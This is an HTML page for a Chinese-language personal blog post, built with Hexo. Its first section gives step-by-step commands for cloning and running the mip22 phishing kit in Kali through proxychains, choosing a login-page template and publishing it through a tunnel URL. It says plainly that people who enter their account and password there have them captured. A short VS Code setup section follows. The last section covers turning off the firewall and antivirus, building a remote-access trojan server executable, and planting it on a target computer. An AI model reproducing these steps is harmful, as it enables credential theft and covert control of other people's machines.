@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>kali中设置钓鱼网站 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="kali中设置钓鱼网站 下载文件  输入sudo su进入管理员模式 vim  &#x2F;etc&#x2F;proxychains4.conf 进入proxychains4.conf将地址改为主机地址和主机clash的端口号。点i进入插入模式。  点esc退出插入模式，输入：wq！（强制保存退出） proxychains4 git clone https:&#x2F;&#x2F;github.com&#x2F;makdosx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali中设置钓鱼网站">
+<meta property="og:url" content="http://example.com/2023/11/28/kali%E4%B8%AD%E8%AE%BE%E7%BD%AE%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="kali中设置钓鱼网站 下载文件  输入sudo su进入管理员模式 vim  &#x2F;etc&#x2F;proxychains4.conf 进入proxychains4.conf将地址改为主机地址和主机clash的端口号。点i进入插入模式。  点esc退出插入模式，输入：wq！（强制保存退出） proxychains4 git clone https:&#x2F;&#x2F;github.com&#x2F;makdosx">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128154710552.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128160601296.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128161045346.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128161324649.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128172755036.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128190504339.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128190648462.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128191027136.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128191835337.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128192616861.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128192852101.png">
+<meta property="og:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128193204132.png">
+<meta property="article:published_time" content="2023-11-28T03:15:53.000Z">
+<meta property="article:modified_time" content="2023-11-28T11:33:36.786Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128154710552.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-kali中设置钓鱼网站" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/11/28/kali%E4%B8%AD%E8%AE%BE%E7%BD%AE%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/" class="article-date">
+  <time class="dt-published" datetime="2023-11-28T03:15:53.000Z" itemprop="datePublished">2023-11-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      kali中设置钓鱼网站
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="kali中设置钓鱼网站"><a href="#kali中设置钓鱼网站" class="headerlink" title="kali中设置钓鱼网站"></a>kali中设置钓鱼网站</h2><ul>
+<li>下载文件</li>
+</ul>
+<p>输入sudo su进入管理员模式</p>
+<p>vim  &#x2F;etc&#x2F;proxychains4.conf</p>
+<p>进入proxychains4.conf将地址改为主机地址和主机clash的端口号。点i进入插入模式。</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128154710552.png" alt="image-20231128154710552"></p>
+<p>点esc退出插入模式，输入：wq！（强制保存退出）</p>
+<p>proxychains4 git clone <a target="_blank" rel="noopener" href="https://github.com/makdosx/mip22%EF%BC%88%E4%B8%8B%E8%BD%BDgithub%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%89">https://github.com/makdosx/mip22（下载github中的文件）</a></p>
+<p>ls（查看是否有mip22文件夹）</p>
+<p>cd mip22(转到mip22文件夹)</p>
+<p>chomod +x .&#x2F;*(加x权限)</p>
+<p>proxychains4 bash .&#x2F;mip22.sh(设置钓鱼网站)</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128160601296.png" alt="image-20231128160601296"></p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128161045346.png" alt="image-20231128161045346"></p>
+<p>接下来输入</p>
+<p>1</p>
+<p>19（选择需要的网站）</p>
+<p>3</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128161324649.png" alt="image-20231128161324649"></p>
+<p>看到网子就成功了。</p>
+<p>在网站中打开网址<a target="_blank" rel="noopener" href="http://asking-wars-mozambique-vincent.trycloudflare.com/">http://asking-wars-mozambique-vincent.trycloudflare.com</a></p>
+<p>这时候别人点击网站输入账号密码就可以获取。</p>
+<h2 id="Visual-Studio-Code"><a href="#Visual-Studio-Code" class="headerlink" title="Visual-Studio-Code"></a>Visual-Studio-Code</h2><ul>
+<li>安装与下载</li>
+</ul>
+<p>官方网站：<a target="_blank" rel="noopener" href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
+<ul>
+<li>配置</li>
+</ul>
+<p>点击扩展</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128172755036.png" alt="image-20231128172755036"></p>
+<p>下载Chinese（简体），Code Runner,Pylance,再重启vs即可使用。</p>
+<p>输入代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests;</span><br><span class="line">url = &quot;https://httpbin.org/get&quot;</span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure>
+
+<p>点击右上角运行</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128190504339.png" alt="image-20231128190504339"></p>
+<p>会报错，再同时点击ctrl和~打开终端。</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128190648462.png" alt="image-20231128190648462"></p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install (chardet) -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br><span class="line">括号中写入要安装的</span><br></pre></td></tr></table></figure>
+
+<p>安装完后再运行</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128191027136.png" alt="image-20231128191027136"></p>
+<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><p>要关闭防火墙和实时保护。</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128191835337.png" alt="image-20231128191835337"></p>
+<p>下载windows病毒监听&#x2F;DHLv9.5.zip并打开。</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128192616861.png" alt="image-20231128192616861"></p>
+<p>再点击服务生成，域名ip改成本机ip，再点击生成服务。</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128192852101.png" alt="image-20231128192852101"></p>
+<p>再将生成的Server.exe放在要控制的电脑上。</p>
+<p>这时软件上会多一个控制电脑的信息，就可以对这台电脑进行控制了。</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128193204132.png" alt="image-20231128193204132"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/28/kali%E4%B8%AD%E8%AE%BE%E7%BD%AE%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/" data-id="clpi9h65r00003ku4hf5e01de" data-title="kali中设置钓鱼网站" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/11/27/%E6%B3%A8%E5%86%8Ctg%E5%8F%B7/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">注册tg号</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/28/kali%E4%B8%AD%E8%AE%BE%E7%BD%AE%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/">kali中设置钓鱼网站</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/27/%E6%B3%A8%E5%86%8Ctg%E5%8F%B7/">注册tg号</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/27/sqlmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/23/%E4%B8%8B%E8%BD%BDBurpSuite/">下载BurpSuite与SQL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/22/phpMyAdmin/">phpMyAdmin</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
